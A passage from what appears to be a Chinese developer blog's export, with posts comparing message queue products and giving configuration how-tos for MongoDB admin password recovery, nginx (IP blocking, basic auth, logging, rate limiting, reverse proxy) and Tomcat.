<p>优点：</p>
<ol>
<li>客户端语言: Java,C,C++,C#,Ruby,Perl,Python,PHP</li>
<li>支持协议： <code>JMS</code>,<code>OpenWire</code>,<code>STOMP</code>,<code>XMPP</code>,<code>AMQP</code></li>
<li>支持 <code>MQTT</code> (个人比较关注这点)</li>
<li>支持SpringBoot-Starter( <code>spring-boot-starter-activemq</code> )</li>
<li>支持集群，负载均衡，事务，持久化</li>
<li>对Spring的支持，可以很容易内嵌到使用Spring的系统里面去</li>
<li>支持通过JDBC和journal提供高速的消息持久化</li>
<li>支持独立部署和嵌入部署</li>
</ol>
<p>缺点：</p>
<ol>
<li>团队重心放到<code>Apollo</code>上去了，目前社区不活跃，且对 5.x 维护较少。</li>
<li>不适合用于上千个队列的应用场景，并发高容易丢消息。</li>
</ol>
<p>评价：</p>
<p>ActiveMQ 作为老牌MQ，支持很多协议，很全面，但以 <code>JMS</code> 为主，在很多公司得到了应用，但是更新力度不够。</p>
<h4 id="RabbitMQ"><a href="#RabbitMQ" class="headerlink" title="RabbitMQ"></a>RabbitMQ</h4><p>Erlang开发的，是AMQP规范的参考实现，AMQP是一个线路层协议，面面俱到，很系统，也稍显复杂。目前已经成为OpenStack Iaas平台首选的消息服务，其背后的支持力度不言而喻。</p>
<p>优点：</p>
<ol>
<li>客户端语言: 支持力度大，覆盖大部分语言。</li>
<li>支持协议：<code>AMQP</code> , <code>STOMP</code> </li>
<li>支持 <code>MQTT</code> (<a href="http://www.rabbitmq.com/mqtt.html" target="_blank" rel="noopener"><code>RabbitMQ supports MQTT as of 3.0</code></a>) ，它是以插件的形式支持了<code>MQTT</code> 。</li>
<li>支持Spring Boot-Starter (<code>spring-boot-starter-amqp</code>)</li>
<li><strong>Spring Cloud Bus 默认使用它作为中间层。</strong></li>
<li>支持集群，负载均衡，持久化</li>
<li>团队和社区支持力度大</li>
<li>高并发性能好，在互联网公司有较大规模的应用。</li>
</ol>
<p>缺点：</p>
<ol>
<li>集群不支持动态扩展</li>
<li>不支持嵌入式部署</li>
</ol>
<p>评价：</p>
<p>很有活力的项目，以 <code>AMQP</code> 协议为主，不断开始兼容其他协议，如<code>MQTT</code> 。 </p>
<h4 id="Kafka"><a href="#Kafka" class="headerlink" title="Kafka"></a>Kafka</h4><p>Java开发的，也是Apache的项目，最初被设计用来做日志处理，是一个不折不扣的大数据通道，追求高吞吐，存在丢消息的可能。</p>
<p>优点：</p>
<ol>
<li>Spring Cloud Bus 中间层的第二选择。</li>
<li>并发高，吞吐量大</li>
</ol>
<p>缺点：</p>
<ol>
<li>很多东西不支持</li>
</ol>
<p>评价：</p>
<p>比较适合用于日志。</p>
<h4 id="RocketMQ"><a href="#RocketMQ" class="headerlink" title="RocketMQ"></a>RocketMQ</h4><p>Java开发的，阿里开发，后来捐给了Apache。天生为金融互联网领域而生，追求高可靠、高可用、高并发、低延迟。</p>
<p>优点：</p>
<ol>
<li>高可靠、高可用、高并发、低延迟，支持上万个队列。</li>
<li>理论上不会丢失消息</li>
</ol>
<p>缺点：</p>
<ol>
<li>阿里自己实现的一套协议。</li>
<li>还没有支持 Spring Boot-Starter</li>
</ol>
<p>评价：</p>
<p>如果单纯使用MQ，并且很注重消息的丢失，没有其他协议的兼容问题，可以支持一下国产软件。</p>
<h4 id="Mosquitto"><a href="#Mosquitto" class="headerlink" title="Mosquitto"></a>Mosquitto</h4><p>C语言开发的轻量级开源MQTT Broker，实现了MQTT协议版本3.1和3.1.1。可以说是MQTT协议坚定的执行者，现在已经是eclipse的项目。</p>
<blockquote>
<p>Mosquitto不太属于此文讨论的MQ产品，但有些MQ产品也支持MQTT ，我觉得Mosquitto应该数最好的MQTT Broker了，也比较一下吧。</p>
</blockquote>
<p>优点：</p>
<ol>
<li>专注于做MQTT协议</li>
<li>轻量级</li>
</ol>
<p>缺点：</p>
<ol>
<li>客户端只有C库</li>
<li>无管理界面（轻量级嘛）</li>
</ol>
<p>评价：</p>
<p>单纯做MQTT Broker的话，这是首选。RabbitMQ 和 ActiveMQ都是已插件的方式支持MQTT协议。另外Mosquitto这个项目提供的C库libmosquitto很适合嵌入式设备。</p>
<h3 id="我的选型"><a href="#我的选型" class="headerlink" title="我的选型"></a>我的选型</h3><ol>
<li>开发语言 Java</li>
<li>框架 Spring Boot ，Spring Cloud</li>
<li>要用到 <code>订阅/发布模式</code> （所有MQ产品都支持） 和 MQTT</li>
<li>将来可能会使用到 Spring Cloud Bus</li>
<li>并发要求不是特别高</li>
</ol>
<p>结果：RabbitMQ 优先，ActiveMQ随后。</p>
]]></content>
      <categories>
        <category>Web后端</category>
      </categories>
      <tags>
        <tag>MQ</tag>
      </tags>
  </entry>
  <entry>
    <title>MongoDb忘记管理员密码</title>
    <url>/Web%E5%90%8E%E7%AB%AF/MongoDb%E5%BF%98%E8%AE%B0%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81/</url>
    <content><![CDATA[<p>忘记管理员密码对于创建数据库等操作会有影响，本文基于Mongo v3.4.10将做一次处理这个问题的示例，整体方向就是删除所有的管理员用户，重新创建。</p>
<ol>
<li><p>关闭mongod的认证</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#security:</span><br><span class="line"># authorization: enabled</span><br></pre></td></tr></table></figure>
</li>
<li><p>重启mongod</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ service mongod restart</span><br></pre></td></tr></table></figure>
</li>
<li><p>登录mongo命令行,删除所有admim数据库中的账号</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ mongo</span><br><span class="line">&gt; use admin </span><br><span class="line">&gt; db.system.users.find()</span><br><span class="line">&gt; db.system.users.remove(&#123;&#125;)</span><br></pre></td></tr></table></figure>
</li>
<li><p>创建超级管理员root</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; db.createUser(&#123;user:&apos;root&apos;,pwd:&apos;123456&apos;,roles:[&#123;&quot;role&quot;:&quot;root&quot;,&quot;db&quot;:&quot;admin&quot;&#125;]&#125;)</span><br></pre></td></tr></table></figure>
</li>
<li><p>验证root密码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; db.auth(&apos;root&apos;,&apos;123456&apos;)</span><br></pre></td></tr></table></figure>
</li>
<li><p>创建一个示例数据库：testdb</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; use testdb</span><br></pre></td></tr></table></figure>
</li>
<li><p>为示例数据库：testdb 创建一个可读写的用户</p>
<figure class="highlight plain"><figcaption><span>db.createUser(&#123;user:'testuser',pwd:'123456',roles:[&#123;"role":"readWrite","db":"testdb"&#125;]&#125;)</span></figcaption><table><tr><td class="code"><pre><span class="line">```</span><br><span class="line">8. 认证</span><br></pre></td></tr></table></figure>
</li>
</ol>
<blockquote>
<p>db.auth(‘testuser’,’123456a’)<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">9. 在testdb的col(collection)插入一条数据（不然不会创建数据库）</span><br></pre></td></tr></table></figure></p>
</blockquote>
<blockquote>
<p>db.col.insert({‘test’:’123’})<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">10. 开启认证</span><br><span class="line">去掉 security:authorization: enabled注释,重启mongod</span><br><span class="line">11. 与mongo同一台机器安装adminMongo</span><br></pre></td></tr></table></figure></p>
</blockquote>
<p>$ git clone <a href="https://github.com/mrvautin/adminMongo.git" target="_blank" rel="noopener">https://github.com/mrvautin/adminMongo.git</a><br>$ cd adminMongo<br>$ npm install<br>$ vim /config/app.json<br>{<br>    “app”: {<br>        “host”: “0.0.0.0”,<br>        “port”: 4321,<br>        “docs_per_page”: 20,<br>        “password”: “adm123”,<br>        “locale”: “en”,<br>        “context”: “dbApp”,<br>        “monitoring”: true<br>    }<br>}<br>$ npm start<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">12. IP：port 访问adminMongo，密码是app.json中设置的密码</span><br><span class="line">12. adminMongo 用超级用户创建连接</span><br></pre></td></tr></table></figure></p>
<p>mongodb://root:<a href="mailto:123456@127.0.0.1" target="_blank" rel="noopener">123456@127.0.0.1</a>:27017<br><code>`</code></p>
<ol start="13">
<li>在adminMongo中试一下创建数据库，为数据库创建用户等操作，完成。</li>
</ol>
]]></content>
      <categories>
        <category>Web后端</category>
      </categories>
  </entry>
  <entry>
    <title>nginx不转发header</title>
    <url>/Web%E5%90%8E%E7%AB%AF/Nginx%E4%B8%8D%E8%BD%AC%E5%8F%91header/</url>
    <content><![CDATA[<p>如果header有下划线，是不转发的，如果一定要下划线，要在配置 http{} 加入    underscores_in_headers on;</p>
<p><a href="http://blog.csdn.net/loongshawn/article/details/78199977?locationNum=5&amp;fps=1" target="_blank" rel="noopener">参考</a></p>
]]></content>
      <categories>
        <category>Web后端</category>
      </categories>
      <tags>
        <tag>nginx</tag>
      </tags>
  </entry>
  <entry>
    <title>nginx反向代理保留远程IP</title>
    <url>/Web%E5%90%8E%E7%AB%AF/Nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E4%BF%9D%E7%95%99%E8%BF%9C%E7%A8%8BIP/</url>
    <content><![CDATA[<p>如果使用Nginx做反向代理到本地的SpringBoot服务，那么SpringBoot服务获取的远程    地址IP是nginx的，如何获取客户端的IP呢？</p>
<p>有一简单的方法是通过设置一个自定义Header来实现。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">        listen 80;</span><br><span class="line">        server_name 127.0.0.1:80;</span><br><span class="line">		location / &#123;</span><br><span class="line">                proxy_set_header Host $host;</span><br><span class="line">                proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">                proxy_set_header REMOTE-HOST $remote_addr;</span><br><span class="line">                proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line"></span><br><span class="line">                proxy_pass http://127.0.0.1:8282/api/;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>SpringBoot内获取客户端的真实IP<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// HttpServletRequest</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//这里其实是nginx的IP，则本地。</span></span><br><span class="line">String nginxIP = request.getRemoteAddr();        </span><br><span class="line"></span><br><span class="line"><span class="comment">//自己设置的自定义Header，为请求clicent端的IP。</span></span><br><span class="line">String clientIP = request.getHeader(<span class="string">"X-Real-IP"</span>);</span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>Web后端</category>
      </categories>
      <tags>
        <tag>nginx</tag>
      </tags>
  </entry>
  <entry>
    <title>Nginx屏蔽IP</title>
    <url>/Web%E5%90%8E%E7%AB%AF/Nginx%E5%B1%8F%E8%94%BDIP/</url>
    <content><![CDATA[<p>以下是手动屏蔽固定的IP，还有一些方法可以自动将IP屏蔽待以后需要再研究。</p>
<h3 id="1-假设nginx的配置中有如下一个server"><a href="#1-假设nginx的配置中有如下一个server" class="headerlink" title="1. 假设nginx的配置中有如下一个server"></a>1. 假设nginx的配置中有如下一个server</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">	listen 80;</span><br><span class="line">	server_name localhost;</span><br><span class="line"></span><br><span class="line">	location / &#123;</span><br><span class="line"></span><br><span class="line">		root   /var/www/localhost;</span><br><span class="line">		index  index.html index.htm;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="2-如果现在我需要屏蔽两个IP，加入以下三行到server节点中："><a href="#2-如果现在我需要屏蔽两个IP，加入以下三行到server节点中：" class="headerlink" title="2. 如果现在我需要屏蔽两个IP，加入以下三行到server节点中："></a>2. 如果现在我需要屏蔽两个IP，加入以下三行到server节点中：</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># allow 一定要在 deny 前面</span></span><br><span class="line">allow all;</span><br><span class="line">deny 123.123.123.123;</span><br><span class="line">deny 123.123.123.124;</span><br></pre></td></tr></table></figure>
<h3 id="3-如果要屏蔽一个123-123-123-x-这个IP段，写法如下："><a href="#3-如果要屏蔽一个123-123-123-x-这个IP段，写法如下：" class="headerlink" title="3. 如果要屏蔽一个123.123.123.x 这个IP段，写法如下："></a>3. 如果要屏蔽一个123.123.123.x 这个IP段，写法如下：</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">deny 123.123.123.0/24;</span><br></pre></td></tr></table></figure>
<p>示例：<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">	listen 80;</span><br><span class="line">	server_name localhost;</span><br><span class="line"></span><br><span class="line">	location / &#123;</span><br><span class="line"></span><br><span class="line">		root   /var/www/;</span><br><span class="line">		index  index.html index.htm;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment"># allow 一定要在 deny 前面</span></span><br><span class="line">	allow all;</span><br><span class="line">	deny 123.123.123.0/24;</span><br><span class="line">	error_page   500 502 503 504  /50x.html;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="4-屏蔽配置写入文件"><a href="#4-屏蔽配置写入文件" class="headerlink" title="4. 屏蔽配置写入文件"></a>4. 屏蔽配置写入文件</h3><p>创建一个文件如 <code>blockips.conf</code> ，包含屏蔽内容，在server中 include 此文件即可。<br>示例 <code>blockips.conf</code>：<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">allow all;</span><br><span class="line">deny 123.123.123.123;</span><br><span class="line">deny 123.123.123.124;</span><br></pre></td></tr></table></figure></p>
<p>示例 <code>nginx.conf</code>：<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">	listen 80;</span><br><span class="line">	server_name localhost;</span><br><span class="line"></span><br><span class="line">	location / &#123;</span><br><span class="line"></span><br><span class="line">		root   /var/www/;</span><br><span class="line">		index  index.html index.htm;</span><br><span class="line">	&#125;</span><br><span class="line">	include blockips.conf;</span><br><span class="line">	error_page   500 502 503 504  /50x.html;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="5-仅允许内网访问"><a href="#5-仅允许内网访问" class="headerlink" title="5. 仅允许内网访问"></a>5. 仅允许内网访问</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># block one workstation</span></span><br><span class="line">deny    192.168.1.1;</span><br><span class="line"><span class="comment"># allow anyone in 192.168.1.0/24</span></span><br><span class="line">allow   192.168.1.0/24;</span><br><span class="line"><span class="comment"># drop rest of the world</span></span><br><span class="line">deny    all;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Web后端</category>
      </categories>
      <tags>
        <tag>nginx</tag>
      </tags>
  </entry>
  <entry>
    <title>nginx开启用户授权</title>
    <url>/Web%E5%90%8E%E7%AB%AF/Nginx%E5%BC%80%E5%90%AF%E7%94%A8%E6%88%B7%E6%8E%88%E6%9D%83/</url>
    <content><![CDATA[<p>有时候有些静态网站：如文档类的，放在公网，希望要用户认证才能访问，Nginx的<br><code>ngx_http_auth_basic_module</code> 模块基于 <code>“HTTP Basic Authentication”</code> 协议实现了用户认证，可以很方便的实现用户认证。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">	listen 80;</span><br><span class="line">	server_name localhost;</span><br><span class="line"></span><br><span class="line">	<span class="comment"># 随便填些信息都行</span></span><br><span class="line">	<span class="comment"># auth_basic off 关闭用户授权</span></span><br><span class="line">	auth_basic <span class="string">"welcome"</span>;</span><br><span class="line">	<span class="comment"># 授权信息路径</span></span><br><span class="line">	auth_basic_user_file /etc/auth_basic/userpasswd;</span><br><span class="line"></span><br><span class="line">	location / &#123;</span><br><span class="line">		root   /var/www/<span class="built_in">test</span>;</span><br><span class="line">		index  index.html;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>userpasswd</code> 这个文件的一行代表一个用户，格式是： <code>user:passwd</code> ，其中密码是加密的，可以通过 <code>htpasswd</code> 工具来生成。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ htpasswd -cb ./userpasswd <span class="built_in">test</span> 123456</span><br><span class="line">Adding password <span class="keyword">for</span> user <span class="built_in">test</span></span><br><span class="line">$ cat userpasswd </span><br><span class="line"><span class="built_in">test</span>:<span class="variable">$apr1</span><span class="variable">$2fZNNVc7</span>$/w76Ek8aezH7g1WoLgtx5/</span><br></pre></td></tr></table></figure>
<p><strong> 浏览器授权访问 </strong><br><img src="/images/Web后端/nginx_basic_auth.png" alt></p>
<p><strong> postman授权访问 </strong><br><img src="/images/Web后端/nginx_basic_auth_postman.png" alt></p>
<p><strong> postman访问密码错误 </strong><br><img src="/images/Web后端/nginx_basic_auth_postman_401.png" alt></p>
]]></content>
      <categories>
        <category>Web后端</category>
      </categories>
      <tags>
        <tag>nginx,ab</tag>
      </tags>
  </entry>
  <entry>
    <title>nginx日志管理</title>
    <url>/Web%E5%90%8E%E7%AB%AF/Nginx%E6%97%A5%E5%BF%97%E7%AE%A1%E7%90%86/</url>
    <content><![CDATA[<h3 id="1-最简单的全局日志"><a href="#1-最简单的全局日志" class="headerlink" title="1. 最简单的全局日志"></a>1. 最简单的全局日志</h3><p>全部server的日志都记录再统计一个log文件。<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">http &#123;</span><br><span class="line"></span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line">    <span class="comment">##</span></span><br><span class="line">    <span class="comment"># Logging Settings</span></span><br><span class="line">    <span class="comment">##</span></span><br><span class="line"></span><br><span class="line">    access_log /var/<span class="built_in">log</span>/nginx/access.log;</span><br><span class="line">    error_log /var/<span class="built_in">log</span>/nginx/error.log;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    server&#123;</span><br><span class="line">    	***</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server&#123;</span><br><span class="line">    	***</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="2-server局部日志"><a href="#2-server局部日志" class="headerlink" title="2. server局部日志"></a>2. server局部日志</h3><p>每个server单独分配一个log文件，可以避免不同server之间的日志混淆，可以更加清晰的分析日志。<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">   <span class="comment">##</span></span><br><span class="line">   <span class="comment"># 全局Logging Settings</span></span><br><span class="line">   <span class="comment">##</span></span><br><span class="line"></span><br><span class="line">   access_log /var/<span class="built_in">log</span>/nginx/access.log;</span><br><span class="line">   error_log /var/<span class="built_in">log</span>/nginx/error.log;</span><br><span class="line">   ...</span><br><span class="line"></span><br><span class="line">   <span class="comment"># 此server单独一个日志文件</span></span><br><span class="line">   server&#123;</span><br><span class="line">   	access_log /var/<span class="built_in">log</span>/nginx/access_test.log;</span><br><span class="line">   	error_log /var/<span class="built_in">log</span>/nginx/error_test.log;</span><br><span class="line">   	***</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment"># 此server使用默认的全局</span></span><br><span class="line">   server&#123;</span><br><span class="line">   	***</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="3-自定义日志格式"><a href="#3-自定义日志格式" class="headerlink" title="3. 自定义日志格式"></a>3. 自定义日志格式</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">http &#123;</span><br><span class="line"></span><br><span class="line">    log_format  main  <span class="string">'$remote_addr - $remote_user [$time_local] "$request" '</span></span><br><span class="line">                      <span class="string">'$status $body_bytes_sent "$http_referer" '</span></span><br><span class="line">                      <span class="string">'"$http_user_agent" "$http_x_forwarded_for"'</span>;</span><br><span class="line"></span><br><span class="line">      access_log  logs/access.log  main;</span><br><span class="line">      error_log  logs/access.log ;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Web后端</category>
      </categories>
      <tags>
        <tag>nginx</tag>
      </tags>
  </entry>
  <entry>
    <title>nginx部署文件下载站点</title>
    <url>/Web%E5%90%8E%E7%AB%AF/Nginx%E9%83%A8%E7%BD%B2%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E7%AB%99%E7%82%B9/</url>
    <content><![CDATA[<p>Nginx可以提供一个简单的Web页面站点为你提供文件下载服务。<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">	listen 6060;</span><br><span class="line">	server_name localhost;</span><br><span class="line">	location / &#123;</span><br><span class="line">		root   /var/www/download;</span><br><span class="line"></span><br><span class="line">		<span class="comment"># 开启文件服务</span></span><br><span class="line">		autoindex on;</span><br><span class="line">		autoindex_exact_size off;</span><br><span class="line">		autoindex_localtime on;</span><br><span class="line">		<span class="comment">#autoindex_format的值默认是html 另外还可以设置为： xml | json | jsonp ，windows下中文文件名会乱码</span></span><br><span class="line">		autoindex_format json;</span><br><span class="line">		</span><br><span class="line">		<span class="comment"># 下载x流量之后开启限速</span></span><br><span class="line">		limit_rate_after 100k;</span><br><span class="line">		<span class="comment"># 每个连接的下载速度限制</span></span><br><span class="line">		limit_rate 50k;</span><br><span class="line">		<span class="comment"># 展示中文文件名</span></span><br><span class="line">		charset utf-8,gbk; </span><br><span class="line">	&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></p>
<p><strong> 效果： </strong></p>
<p><img src="/images/Web后端/nginx_file_web1.png" alt><br><img src="/images/Web后端/nginx_file_web2.png" alt></p>
]]></content>
      <categories>
        <category>Web后端</category>
      </categories>
      <tags>
        <tag>nginx,文件服务</tag>
      </tags>
  </entry>
  <entry>
    <title>Tomcat自定义web-apps的路径</title>
    <url>/Web%E5%90%8E%E7%AB%AF/Tomcat%E8%87%AA%E5%AE%9A%E4%B9%89web-apps%E7%9A%84%E8%B7%AF%E5%BE%84/</url>
    <content><![CDATA[<p>server.xml的Host节点<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;Context path=&quot;/demo&quot; docBase=&quot;D:\SourceCode\MyEclipse\KevinServlet\WebRoot&quot; reloadable=&quot;true&quot; /&gt;</span><br><span class="line">&lt;Context path=&quot;/example&quot; docBase=&quot;D:\SourceCode\MyEclipse\examples&quot; reloadable=&quot;true&quot; /&gt;</span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>Web后端</category>
      </categories>
  </entry>
  <entry>
    <title>Nginx+Tomcat负载均衡</title>
    <url>/Web%E5%90%8E%E7%AB%AF/Tomcat+Nginx%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1/</url>
    <content><![CDATA[<p>环境和实现效果：</p>
<ol>
<li>两个Tomcat实例监听8081和8083端口</li>
<li>NGINX监听80端口，通过负载均衡将请求转发到Tomcat实例</li>
<li>客户端访问80端口，结果是Tomcat响应的内容</li>
</ol>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment">#负载均衡</span></span><br><span class="line"><span class="section">http</span> &#123;</span><br><span class="line">	<span class="attribute">upstream</span> tomcattest.com &#123;</span><br><span class="line">		<span class="attribute">server</span>   localhost:<span class="number">8081</span>; </span><br><span class="line">		<span class="attribute">server</span>   localhost:<span class="number">8083</span>;  </span><br><span class="line">	&#125;</span><br><span class="line">	<span class="section">server</span> &#123;</span><br><span class="line">		<span class="attribute">listen</span> <span class="number">80</span>;</span><br><span class="line">		<span class="attribute">server_name</span> localhost;</span><br><span class="line">		<span class="attribute">location</span> / &#123;</span><br><span class="line">			<span class="attribute">proxy_pass</span> http://tomcattest.com;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>配置解析：</p>
<ol>
<li>tomcattest.com是我随便填的，应该只是内部用的。</li>
<li>upstream有多种负载均衡模式，默认是按照顺序轮询。</li>
</ol>
]]></content>
      <categories>
        <category>Web后端</category>
      </categories>
  </entry>
  <entry>
    <title>nginx限制下载速率</title>
    <url>/Web%E5%90%8E%E7%AB%AF/Nginx%E9%99%90%E5%88%B6%E4%B8%8B%E8%BD%BD%E9%80%9F%E7%8E%87/</url>
    <content><![CDATA[<p>有些文件放在nginx下，如果不做速率限制，当客户端的网络环境比较好的话，下载速度非常快。这本来是好事，但假如服务器带宽只有10M，而有一个客户下载速率达到10M的话，其他的客户将无法访问服务器。<br>所以，要对单独一个连接进行速率限制。</p>
<h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>为方便局域网内测试，这里将限制值设置的比较小。<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">		listen 80;</span><br><span class="line">		server_name localhost;</span><br><span class="line">		location / &#123;</span><br><span class="line">			root   /var/www/<span class="built_in">test</span>;</span><br><span class="line">			autoindex on;</span><br><span class="line">			autoindex_exact_size off;</span><br><span class="line">			autoindex_localtime on;</span><br><span class="line">			</span><br><span class="line">			<span class="comment"># Sets the initial amount after which the further </span></span><br><span class="line">			<span class="comment"># transmission of a response to a client will be rate limited</span></span><br><span class="line">			<span class="comment"># limit_rate_after 10m;</span></span><br><span class="line">			limit_rate_after 100k;</span><br><span class="line">			<span class="comment"># 每个连接的下载速度限制</span></span><br><span class="line">			limit_rate 50k;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></p>
<p><code>limit_rate_after</code> 是一个门阀，表示客户下载 <code>10m</code> 或者 <code>100k</code> 的byte之后开始触发速率限制。<br><code>limit_rate</code> 是速率限制，最高 <code>50k</code> 。</p>
<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><h3 id="1-wget"><a href="#1-wget" class="headerlink" title="1. wget"></a>1. wget</h3><p>用wget下载单个文件下载的限制效果</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">root@bogon:~/download<span class="comment"># wget http://192.168.0.30:6060/test.zip</span></span><br><span class="line">--2019-08-01 11:12:20--  http://192.168.0.30:6060/test.zip</span><br><span class="line">Connecting to 192.168.0.30:6060... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 3520836 (3.4M) [application/zip]</span><br><span class="line">Saving to: ‘test.zip.2’</span><br><span class="line">test.zip.2           100%[=====================&gt;]   3.36M  50.3KB/s    <span class="keyword">in</span> 67s     </span><br><span class="line">2019-08-01 11:13:26 (51.7 KB/s) - ‘test.zip.2’ saved [3520836/3520836]</span><br></pre></td></tr></table></figure>
<h3 id="2-apache-ab"><a href="#2-apache-ab" class="headerlink" title="2. apache ab"></a>2. apache ab</h3><p><code>-n 10</code> 表示总请求数为10，共发出了10次请求<br><code>-c 10</code> 表示并发用户数为10，同时有10个用户访问</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">root@bogon:~/download<span class="comment"># ab -n 10 -c 10  http://192.168.0.30:6060/test.zip</span></span><br><span class="line">This is ApacheBench, Version 2.3 &lt;<span class="variable">$Revision</span>: 1706008 $&gt;</span><br><span class="line">Copyright 1996 Adam Twiss, Zeus Technology Ltd, http://www.zeustech.net/</span><br><span class="line">Licensed to The Apache Software Foundation, http://www.apache.org/</span><br><span class="line"></span><br><span class="line">Benchmarking 192.168.0.30 (be patient).....<span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Server Software:        nginx</span><br><span class="line">Server Hostname:        192.168.0.30</span><br><span class="line">Server Port:            6060</span><br><span class="line"></span><br><span class="line">Document Path:          /test.zip</span><br><span class="line">Document Length:        3520836 bytes</span><br><span class="line"></span><br><span class="line">Concurrency Level:      10</span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试总共耗时</span></span><br><span class="line">Time taken <span class="keyword">for</span> tests:   66.629 seconds</span><br><span class="line">Complete requests:      10</span><br><span class="line">Failed requests:        0</span><br><span class="line">Total transferred:      35210750 bytes</span><br><span class="line">HTML transferred:       35208360 bytes</span><br><span class="line"></span><br><span class="line"><span class="comment"># 每秒钟的请求量</span></span><br><span class="line">Requests per second:    0.15 [<span class="comment">#/sec] (mean)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 平均请求等待时间</span></span><br><span class="line">Time per request:       66628.646 [ms] (mean)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 服务器平均请求响应时间</span></span><br><span class="line">Time per request:       6662.865 [ms] (mean, across all concurrent requests)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 带宽速率(这里是 50k * 10连接)</span></span><br><span class="line">Transfer rate:          516.08 [Kbytes/sec] received</span><br><span class="line"></span><br><span class="line">Connection Times (ms)</span><br><span class="line">              min  mean[+/-sd] median   max</span><br><span class="line">Connect:       14   20   4.0     20      28</span><br><span class="line">Processing: 66528 66565  21.2  66563   66592</span><br><span class="line">Waiting:        0   20  10.5     15      31</span><br><span class="line">Total:      66548 66584  22.9  66590   66611</span><br><span class="line"></span><br><span class="line">Percentage of the requests served within a certain time (ms)</span><br><span class="line">  50%  66590</span><br><span class="line">  66%  66606</span><br><span class="line">  75%  66607</span><br><span class="line">  80%  66608</span><br><span class="line">  90%  66611</span><br><span class="line">  95%  66611</span><br><span class="line">  98%  66611</span><br><span class="line">  99%  66611</span><br><span class="line"> 100%  66611 (longest request)</span><br><span class="line">root@bogon:~/download<span class="comment">#</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>注意这里的只是限制了单个连接，像迅雷这种采用了多连接下载的软件，这种方法限制不了，还需要限制单个IP的连接数量等。</p>
</blockquote>
<p><strong>继续</strong><br><strong>继续</strong><br><strong>继续</strong></p>
